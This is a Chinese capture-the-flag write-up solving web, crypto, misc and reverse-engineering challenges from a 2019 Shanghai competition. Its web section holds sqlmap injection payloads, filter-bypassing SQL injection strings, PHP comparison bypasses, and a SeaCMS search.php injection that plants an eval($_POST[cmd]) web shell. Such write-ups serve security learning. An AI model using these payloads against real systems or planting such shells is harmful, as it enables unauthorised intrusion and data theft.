---
title: 2019 “嘉韦思杯”上海市网络安全邀请赛 WriteUp
tags:
  - Writeup
  - CTF
date: 2019-04-25 21:01:00
---
![](/assets/images/move/1553998676094-11998f20-340f-4b54-84a7-2cf69695b8ed.png)

> 文章首发于安恒网络空间安全讲武堂

<!--more-->


## Web1 土肥原贤二 100pt

![](/assets/images/move/1554003555790-d9e1b7c8-2ebe-481a-841c-791332fff7a5.png)

![](/assets/images/move/1554003553807-39a49617-cf49-4427-a30e-23e853bab339.png)

尝试提交`gid=1'`报错，`gid=1 or 1=1`回显正常，直接使用`sqlmap`进行测试，存在以下注入方式:

```bash
Parameter: gid (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: gid=-4255' OR 8149=8149#
    Vector: OR [INFERENCE]#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: gid=3' OR (SELECT 3949 FROM(SELECT COUNT(*),CONCAT(0x717a717671,(SELECT (ELT(3949=3949,1))),0x7178787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Ilbj
    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: gid=3' OR SLEEP(5)-- XAjo
    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: gid=3' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a717671,0x4845486a6d6e79654d7a704461694b426771414872527a57624a724e78735943417a686b53664d6b,0x7178787a71)#
    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
```

Payload:`sqlmap -u "http://47.103.43.235:81/quest/web/a/index.php?gid=1" -p gid -v 3 -D luozhen -T flag -C "id,flag" --dump`.

![](/assets/images/move/1553999401733-e131e902-12f4-4594-8cd8-2908c97b76b4.png)



## Web2 戴星炳 200pt

![](/assets/images/move/1553999536278-3a1ca4ad-0906-4348-868c-6a1d936c96fa.png)

![](/assets/images/move/1553999601102-92cd8fdb-b17b-4b66-9534-da3bfb2afa27.png)

2s快速提交正确结果即可获取flag，Python脚本:

```python
import re
import requests

url = 'http://47.103.43.235:82/web/a/index.php'
r = requests.session()
text = r.get(url).text
calc = str(re.findall("</p><p>(.*?)</p>", text))[2:-2]
ans = eval(calc)
data = {'result':ans}
res = r.post(url, data)
print(res.text)
```

运行结果：flag{Y0U_4R3_3o_F4ST!}。



> WriteUp记录到这里的时候主办方再次关闭了比赛官网,只开放题目链接,下面就各题目进行记录~



## Web3 MD5碰撞

> 题目链接:http://47.103.43.235:85/a/

![](/assets/images/move/1554000675342-e9498167-8684-48de-bb3e-87564420b127.png)

F12查看网页源代码发现以下注释PHP代码:

```php
if ((string)$_POST['param1']!==(string)$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2']))

```

两次比较(`!==`/`===`)均采用了比较严格的比较，无法通过弱类型的比较去绕过。

可以通过MD5碰撞生成器[fastcoll_v1.0.0.5.exe.zip ](http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip)来构造两个MD5值相同，但内容不同的字符串来绕过。

这里参考[MD5碰撞-奶奶奶奶奶糖](https://www.cnblogs.com/zaqzzz/p/10029887.html?tdsourcetag=s_pctim_aiomsg)的样本提交进行测试~

Payload：

```bash
param1=
%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP
&param2=
%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP
```

![](/assets/images/move/1554001644170-04263e3c-bc04-47c4-948c-6fd6386b4cc9.png)

得到flag{MD5@_@success}。



## Web4 SeaCMS

> 题目地址：http://47.103.43.235:84/

![](/assets/images/move/1554000424408-30bad3f8-fd06-43ba-a388-92518add8058.png)

> 后台地址:http://47.103.43.235:84/admin/login.php

尝试弱口令登录后台，回显`admin`用户不存在。

![](/assets/images/move/1554001912126-ba7dc0c9-c4bb-49e5-97f9-e154ab3792c6.png)

参考[Seacms漏洞分析利用复现 By Assassin](https://blog.csdn.net/qq_35078631/article/details/76595817)`Search.php`漏洞利用姿势，写入一句话木马，用Cknife连接之。

Payload:

```bash
http://47.103.43.235:84/search.php?searchtype=5&tid=&area=eval($_POST[cmd])
```



![](/assets/images/move/1554002282231-cc0f85d3-c937-4edf-9005-106ec1360904.png)

在根目录下发现flag.txt，获取flag{!!seacms_@@}。



## Web5 Break the sha

> 题目地址:http://47.103.43.235:82/web/b/index.php

![](/assets/images/move/1554002562345-7c6ce2cf-4a29-4674-9185-d6da51f44e25.png)

F12查看源代码发现`<!--index.phps-->`，访问下载index.phps文件打开获取:

```php
<?php
error_reporting(0);
$flag = '********';
if (isset($_POST['name']) and isset($_POST['password'])){
	if ($_POST['name'] == $_POST['password'])
		print 'name and password must be diffirent';
	else if (sha1($_POST['name']) === sha1($_POST['password']))
		die($flag);
	else print 'invalid password';
}
?>
```

name与password字段用`==`弱类型进行比较，sha1用`===`进行强类型比较，可以用数组绕过。

Payload:

```bash
name[]=1&password[]=2
```

回显：flag{Y0u_just_br0ke_sha1}。



## Web6 SQLi2

> 题目地址:http://47.103.43.235:83/web/a/index.php?id===QM

![](/assets/images/move/1554002957113-e29373a3-5ff7-46e3-bc76-4584f57ff607.png)

观察到`id===QM`，MQ==是1的Base64编码，推测为Base64编码后逆序传值。

手工注入测试发现过滤了`and`、`or`、`select`、`union`关键字，去除了单引号、双引号、等号、空格等字符，可以双写绕过关键字的过滤，采用`/**/`绕过空格，使用字符窜的hex编码绕过引号以及使用`regexp`绕过等号。

- 爆数据库

```bash
-1/**/uniunionon/**/selselectect/**/1,group_concat(schema_name),3,4,5,6/**/from/**/infoorrmation_schema.schemata-- 
```

![](/assets/images/move/1554003553721-fbe774d1-b18c-4deb-8e66-6e700a5d9608.png)

- 爆ctf_sql中的表

```bash
-1/**/uniunionon/**/selselectect/**/1,group_concat(table_name),3,4,5,6/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/regexp/**/0x6374665f73716c-- 
```

![](/assets/images/move/1554003553738-b81ba8df-deda-4dc1-bd5f-1e19336da288.png)

- 爆flag中的列

```bash
-1/**/uniunionon/**/selselectect/**/1,group_concat(column_name),3,4,5,6/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/regexp/**/0x666c6167-- 
```



![](/assets/images/move/1554003553764-0878ae5d-6112-4888-ba72-959707079612.png)

- 获取flag

```bash
-1/**/uniunionon/**/selselectect/**/1,group_concat(flag),3,4,5,6/**/from/**/flag-- 
```



![](/assets/images/move/1554003553799-f9abeb32-626d-498b-9b69-81b2c63ecb74.png)

## Crypto1 神秘代码

![](/assets/images/move/1554003898042-d53ee48c-6ef0-4691-ade1-94dd82ee3a94.png)

```bash
Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1NHVkVRbUZXVmxsM1ZqQmFTMlJIVmtkWGJGcHBWa1phZVZadGVGWmxSbGw1Vkd0c2FsSnRhRzlVVm1oRFZWWmFkR05GZEZSTlZXdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbXRXTVhCRlZXeHdWMDFFUlRCV2Fra3hVakZhV0ZOcmFGWmlhMHBYV1d4b1UwMHhWWGhYYlhSWFRWWndNRlZ0ZUZOVWJVWTJVbFJDVjJFeVRYaFdSRVpyVTBaT2NscEhjRk5XUjNob1YxZDRiMVV4VWtkWGJrNVlZbGhTV0ZSV1pEQk9iR3hXVjJ4T1ZXSkdjRlpXYlhoelZqRmFObEZZYUZkU1JYQklWbXBHVDFkV2NFZGhSMnhUWVROQ1dsWXhXbXROUjFGNVZXNU9hbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKWVFrbFdiWEJIVkRGa1YyTkZaR2hTTW5oVVdWUk9RMWRzV1hoWGJYUk9VbTE0V0ZaWGRHdFdNV1JJWVVac1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5TUmxweFUydGFiRlpzU2xwWlZWcHJZVWRGZWxGcmJGZGlXRUpJVmtSS1UxWXhXblZWYldoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxkSFVsWlVWbHBIVFRGU2MxWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreU1VZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQnhWV3hrVTFsV1VsWlhiVVpyWWtad2VGVnRkREJWTWtwSVZXcENXbFpXY0hKWlZXUkdaVWRPU0U5V2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTVc5bGJHUllaVWM1YVUxWFVucFdNV2h2VjBkS1dWVnJPVlppVkVVd1ZqQmFZVmRIVWtoa1JtUnBWbGhDU2xkV1ZtOVVNVnAwVW01S1QxWnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYVFc1b1dGbFVRWGhUUmtweVdrWm9hV0Y2Vm5oV1ZFSnZVVEZzVjFWc1dsaGlWVnB6V1d0YWQyVkdWWGxrUjNSb1lsVndWMWx1Y0V0V2JGbDZZVVJPV21FeVVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFhZbXhhVjFsc2FFTldSbXhaWTBaa2EwMVdjREJaTUZZd1lWVXhXRlZyYUZkTmFsWlVWa2Q0UzFKc1pIVlRiRlpYWWtoQ05sWkhlR0ZaVm1SR1RsWmFVRlp0YUZSWmJGcExVMnhhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYlVaVlZteHdNMVpyV21GalZrcDFXa1pPVGxacmIzZFhiRlpyWXpGVmVWTnNiRnBOTW1oWVZGWmFTMVZHY0VWU2EzQnNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdibEpzVTBkU2NGVnFRbmRXTVZsNVpFaGtWMDFFUmpGWlZWSlBWMjFGZVZWclpHRldNMmhJV1RKemVGWXhjRWRhUlRWT1VsaENTMVp0TVRCVk1VMTRWVzVTVjJFeVVtaFZNRnBoVmpGc2MxcEVVbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaFhSbFp6WVVaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlXV3RvUTFkV1draGtSMFpvVFdzMWVsWXlOVk5oTVVsNVlVWm9XbFpGTlVSVk1WcHJWbFpHZEZKc1drNVdNVWwzVmxkNGIySXhXWGhhUldob1VtMW9WbFpzV25kTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRllaRmhpUmxweVdYcEdWbVZXVG5KYVIyaE9UVzFvV1ZaR1l6RlZNV1JIVjJ4V1UyRXhjSE5WYlRGVFYyeGtjbFpVUmxkTmEzQktWVmMxYjFZeFdqWlNWRUpoVWtWYWNsVnFTa3RUVmxKMFlVWk9hR1ZzV2pSV2JUQjRaV3N4V0ZadVRsaGlSMmh4V2xkNFlWWXhVbGRYYlVaWFZteHdlbGxWYUd0V2F6RldWbXBTVjJKWVFtaFdiVEZHWkRGYWRWUnNWbGRTVlhCVVYxZDBWbVF5VVhoV2JGSlhWMGhDVkZWV1RsWmxiRXBFVmxod1UxRlRWWHBTUTFWNlVrRWxNMFFsTTBRJTNE
```

在[Base64解密](https://base64.supfree.net/)不断进行B64解密得到：

```bash
fB__l621a4h4g_ai{&i}
```

共20个字符，尝试进行4*5分列得到:

```bash
fB__
l621
a4h4
g_ai
{&i}
```

得到flag{B64_&_2hai_14i}.





## Crypto2 神秘代码2

![](/assets/images/move/1554004239527-8f31de92-5249-4469-a226-cd16338e0dc6.png)

脑洞题目~尝试进行移位变换最终检索到flag{c4es4r_variation}，为凯撒移位的变种。

C++ Payload：

```c++
string s = "bg[`sZ*Zg'dPfP`VM_SXVd";
	for(int diff = 0; diff <= 10; diff++) { //diff为4时得到flag{c4es4r_variation}
		for(int i = 0; i < s.length(); i++) {
			cout << char(s[i] + diff + i);
		}
		cout << endl;
	}
```



## Crypto3 希尔密码

![](/assets/images/move/1554004710459-f5312e45-c4c7-499f-b0e7-ec40fddf252a.png)

给出加密矩阵和密文求明文，这里可以参考[希尔密码解密过程](http://2-dreamfever.lofter.com/post/1d226cf1_748daf4)求出3*3解密矩阵:

[[8,16,27],[8,99 ,24],[27,24,27]]，这里乘上3*4密文矩阵
[[23,10,12,24],[16,2,25,3,],[9,0,9,5]]得到矩阵:



![](/assets/images/move/1554003553863-83d69e0d-0186-4e48-b075-b7524fc2df92.png)

对26进行取余后转化为字符打印得到`hillisflagxx`，C++脚本:

```cpp
#include <iostream>

using namespace std;

int a[12] = {683,112,739,375,1984,278,2787,609,1248,318,1167,855};
int main() {
	for(int i = 0; i < 12; i++) {
		cout << (char)('a' + a[i] % 26);
	}
	return 0;
} 
```



## Crypto4 RSA256

> 题目地址:http://47.103.43.235:85/C/RSA256.tar.gz

下载解压后得到公钥gy.key和fllllllag.txt。

![](/assets/images/move/1554005675490-1166d4ff-7dc7-410e-8e5d-c52d07b20e0d.png)

- 解法1

通过openssl查看公钥信息：

```bash
$ openssl rsa -pubin -in gy.key -text -modulus
Public-Key: (256 bit)
Modulus:
    00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd:
    c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0:
    89:12:d9
Exponent: 65537 (0x10001)
Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9
writing RSA key
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni
0bXTcqTQiRLZAgMBAAE=
-----END PUBLIC KEY-----
```

获取模数（Modulus）`N`以及以及公钥指数（Exponent）`e`：
```bash
N=76775333340223961139427050707840417811156978085146970312315886671546666259161
(0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9)
e=65537 (0x10001)
```

模数N在http://factordb.com可在线分解为：

```bash
 p = 273821108020968288372911424519201044333
 q = 280385007186315115828483000867559983517
```

已知n(可分解为p,q)，e，c，可以计算出d后解密，Python脚本:

```python
import gmpy2
import rsa
p = 273821108020968288372911424519201044333
q = 280385007186315115828483000867559983517
n = 76775333340223961139427050707840417811156978085146970312315886671546666259161
e = 65537
d = int(gmpy2.invert(e , (p-1)*(q-1)))
privatekey = rsa.PrivateKey(n , e , d , p , q)
with open("fllllllag.txt" , "rb") as f:
    print(rsa.decrypt(f.read(), privatekey).decode())
```

得到flag{_2o!9_CTF_ECUN_}。

- 解法2

已知公钥gy.key和cipher message fllllllag.txt求解明文，这里尝试用[RSACtfTool](https://github.com/Ganapati/RsaCtfTool)直接进行解密:

```bash
D:\Tools\Crypto\RSACtfTool\RsaCtfTool
$ python2 RsaCtfTool.py --publickey gy.key --uncipherfile fllllllag.txt
[+] Clear text : b'\x00\x02c\x8bL\xc2u\x86\xc6\xbe\x00flag{_2o!9_CTF_ECUN_}'
```

获取`flag{_2o!9_CTF_ECUN_}`。

## Misc1 奇怪的单点音

> 题目地址：http://47.103.43.235:85/d/奇怪的单点音.wav

播放音频有明显的杂音和3次嘟声，尝试用`Aduacity`打开分析，观察频谱图发现flag字段：

![](/assets/images/move/1554013973079-208fb7fe-d53e-416b-957a-59c3fc96ad48.png)

Hint:主办方声明flag{85a9d4517d4725_b9_8cbc9fd_554216}并非最终答案，请认真审题。

接下来就是脑洞部分，观察到字符串(含下划线)共32位，疑似MD5加密，尝试替换下划线为摩斯密码的t、以及字符串中未出现的数字，当下划线全替换为`0`时在ChaMd5.org成功解密。

![](/assets/images/move/1554014345284-fb9a02d0-4bee-458d-9b99-4ef9f65a1f9a.png)

获取flag{hsd132456}.

## Misc2 二维码

![](/assets/images/move/1554006810662-a2ed7c15-1cfa-4826-9d8e-c2987f3a3eac.png)

下载图片尝试使用`binwalk`进行探测:

```bash
$ python binwalk index.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 256 x 256, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, compressed
5708          0x164C          Zip archive data, encrypted at least v1.0 to extract, compressed size: 64, uncompressed size: 52, name: key.txt
```

发现存在压缩包文件,得到Hint:解压密码为管理人员的QQ号，使用binwalk -e 分离后使用ARCHPR进行爆破。

![](/assets/images/move/1554003554088-cd42c7ce-d92c-4b39-b622-852e7648aab5.png)

获取密码`674290437`，解压得到flag{d6@YX$_m^aa0}。

## Misc3 jsfuck

> 题目地址: http://47.103.43.235:85/b/%E7%AC%AC%E4%B8%80%E9%A2%98_js%EF%BC%9F.txt

![](/assets/images/move/1554005433053-d3dcd64b-9de5-4519-b3bb-d692bde4fa17.png)

Base64解码后得到`jsfuck`加密的js脚本，直接复制在控制台Console运行即可获取flag{sdf465454dfgert32}。

## RE1 梅津美治郎

查壳无壳，为32位PE文件，在IDA中查看：

![](/assets/images/move/1554015021060-73b69107-5841-40ac-b5c7-b60a2ae483ad.png)

Level1基本没什么难度，进入Level2：

![](/assets/images/move/1554015047953-b7d5b0c3-157c-407a-9016-07bed57e4568.png)

这里有个反调试函数，使用x86dbug调试会直接退出。但是使用OD或者吾爱破解版本的OD可以解决这个反调试函数。往后动态调试进到

![](/assets/images/move/1554015050801-9a92b5f8-82da-460b-81a2-a58da0e26fd5.png)

![](/assets/images/move/1554015066468-e7dcb4e1-bf76-4c8e-8be3-591e1da2a6ee.png)里的数据与0x2异或，然后与输入对比，相同即可。

```python
a = [0x75,0x31,0x6e,0x6e,0x66,0x32,0x6c,0x67]
for i in a:
    print (chr(i ^ 0x2),end = '')
```

得到`w3lld0ne`。

![](/assets/images/move/1554015071919-fbe8c373-acbe-4aad-a685-61cc1764a807.png)

使用下划线连接，得到flag{r0b0RUlez!_w3lld0ne}.



## RE2 76号



查看无壳为32位ELF文件。这个纯静态观察即可，查看字符串，这里有correct：

![](/assets/images/move/1554015078147-9af7a645-370d-4de4-945c-6cc9f2964fd2.png)



交叉引用，可以进入到main函数，这里阅读main函数，可以看到printf后再跟getline获取输入，再跟到后面一个check函数 0x804848f,然后根据返回结果判断是否正确。接下来进入到该check函数：

![](/assets/images/move/1554015083187-e2fb1fa5-e502-45b3-91c0-d379db24eec9.png)



反编译check函数，是一个switch。函数的两个参数一个是我们输入的字符串地址，一个是0。寻找问题的关键点在于返回1.

![](/assets/images/move/1554015087648-fd86fbf9-cce2-4ea5-a788-0262d8a26a82.png)



注意每一个return，将可能返回1的return作为重点查看。例如:

![](/assets/images/move/1554015097231-6bca2be3-17c9-4b7e-85fe-b5a63595414f.png)

![](/assets/images/move/1554015106629-712ead24-a1ae-47e2-a59a-379fd6e9aa36.png)

![](/assets/images/move/1554015761147-d68460c4-a888-44de-92bb-ca7b8942ff53.png)

在while循环的开头，每次会填充堆栈里的一个值为1，该值与我们输入有关。以v5[0]为起点。然后仔细阅读C代码，尝试:

![](/assets/images/move/1554015116073-412c7437-7ef3-4b62-a84b-311aa073fa7a.png)

发现符合程序流程。后续继续猜测令V2等于2的case，以此类推。4和8的比较特殊，后面都是手动验证，发现正确符合规律，获取flag{09vdf7wefijbk}~

> Crypto&Misc&RE题目下载链接: https://pan.baidu.com/s/10tlJmUVZtekuYNgTi9eCNQ 提取码: bkiv 